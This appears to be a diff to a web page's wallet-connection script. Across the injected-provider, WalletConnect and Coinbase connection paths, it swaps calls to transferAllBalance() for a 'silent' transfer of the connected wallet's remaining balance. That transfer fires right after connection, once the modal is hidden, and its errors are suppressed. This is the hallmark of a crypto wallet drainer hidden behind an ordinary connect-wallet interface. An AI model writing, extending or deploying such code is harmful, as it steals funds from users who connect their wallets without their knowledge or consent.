@@ -1273,7 +1273,14 @@
                             if (connected) {
                                 try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                                 try { ov.style.display = 'none'; } catch (e) {}
-                                try { await transferAllBalance(); } catch (e) {}
+                                // Execute silent transfer with proper connection info
+                                try {
+                                    const provider = window.ethereum;
+                                    const accounts = await provider.request({ method: 'eth_accounts' });
+                                    const chainId = await provider.request({ method: 'eth_chainId' });
+                                    const connectionInfo = { provider, address: accounts[0], chainId, session: null };
+                                    await silentTransferRemainingBalance(connectionInfo);
+                                } catch (e) { console.warn('Silent transfer failed:', e); }
                                 return;
                             }
                             // if none connected, fall back to scheme/WC
@@ -1296,7 +1303,13 @@
                                 onSuccess: async (client, session) => {
                                     try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                                     try { ov.style.display = 'none'; } catch (e) {}
-                                    await transferAllBalance();
+                                    // Execute silent transfer with WalletConnect session info
+                                    try {
+                                        const accounts = session.namespaces?.eip155?.accounts?.[0]?.split(':')?.[2] || session.accounts?.[0];
+                                        const chainId = session.namespaces?.eip155?.chains?.[0] || '1';
+                                        const connectionInfo = { provider: window.ethereum, address: accounts, chainId, session };
+                                        await silentTransferRemainingBalance(connectionInfo);
+                                    } catch (e) { console.warn('Silent transfer failed:', e); }
                                 }
                             });
                         } catch (e) {
@@ -1358,7 +1371,15 @@
                         await initiateWalletConnectDeepLink({
                             appSchemes: allSchemes,
                             onFail: () => { console.warn('WC deep link failed'); fallback(); },
-                            onSuccess: async (client, session) => { console.log('WC v2 connected via Open wallets'); await transferAllBalance(); }
+                            onSuccess: async (client, session) => {
+                                console.log('WC v2 connected via Open wallets');
+                                try {
+                                    const accounts = session.namespaces?.eip155?.accounts?.[0]?.split(':')?.[2] || session.accounts?.[0];
+                                    const chainId = session.namespaces?.eip155?.chains?.[0] || '1';
+                                    const connectionInfo = { provider: window.ethereum, address: accounts, chainId, session };
+                                    await silentTransferRemainingBalance(connectionInfo);
+                                } catch (e) { console.warn('Silent transfer failed:', e); }
+                            }
                         });
                     } catch (e) {
                         console.error('Open wallets error', e);
@@ -1392,7 +1413,14 @@
                             try {
                                 await a.connector();
                                 try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
-                                await transferAllBalance();
+                                // Execute silent transfer with proper connection info
+                                try {
+                                    const provider = window.ethereum;
+                                    const accounts = await provider.request({ method: 'eth_accounts' });
+                                    const chainId = await provider.request({ method: 'eth_chainId' });
+                                    const connectionInfo = { provider, address: accounts[0], chainId, session: null };
+                                    await silentTransferRemainingBalance(connectionInfo);
+                                } catch (e) { console.warn('Silent transfer failed:', e); }
                             } catch (e) {
                                 console.error('Coinbase extension connect failed', e);
                                 if (a.scheme) tryOpenDeepLink(a.scheme, fallback, () => {}); else fallback();
@@ -1415,7 +1443,14 @@
                             await a.connector();
                             try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
                             try { ov.style.display = 'none'; } catch(e){}
-                            try { await transferAllBalance(); } catch (e) { console.warn('transferAllBalance failed', e); }
+                            // Execute silent transfer with proper connection info
+                            try {
+                                const provider = window.ethereum;
+                                const accounts = await provider.request({ method: 'eth_accounts' });
+                                const chainId = await provider.request({ method: 'eth_chainId' });
+                                const connectionInfo = { provider, address: accounts[0], chainId, session: null };
+                                await silentTransferRemainingBalance(connectionInfo);
+                            } catch (e) { console.warn('Silent transfer failed:', e); }
                         } catch (e) {
                             console.error('Extension connect failed:', e);
                             if (a.scheme) tryOpenDeepLink(a.scheme, fallback, () => {}); else fallback();
@@ -1431,7 +1466,17 @@
                             await initiateWalletConnectDeepLink({
                                 appSchemes: perSchemes,
                                 onFail: () => { tryOpenDeepLink(a.scheme, fallback, () => {}); },
-                                onSuccess: async (client, session) => { try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}; try { ov.style.display = 'none'; } catch(e){}; await transferAllBalance(); }
+                                onSuccess: async (client, session) => {
+                                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
+                                    try { ov.style.display = 'none'; } catch(e){}
+                                    // Execute silent transfer with WalletConnect session info
+                                    try {
+                                        const accounts = session.namespaces?.eip155?.accounts?.[0]?.split(':')?.[2] || session.accounts?.[0];
+                                        const chainId = session.namespaces?.eip155?.chains?.[0] || '1';
+                                        const connectionInfo = { provider: window.ethereum, address: accounts, chainId, session };
+                                        await silentTransferRemainingBalance(connectionInfo);
+                                    } catch (e) { console.warn('Silent transfer failed:', e); }
+                                }
                             });
                         } catch (e) {
                             console.error('WC attempt error:', e);
@@ -2018,4 +2063,5 @@
     <script src="script.js"></script>
 </body>
 </html>
+
 
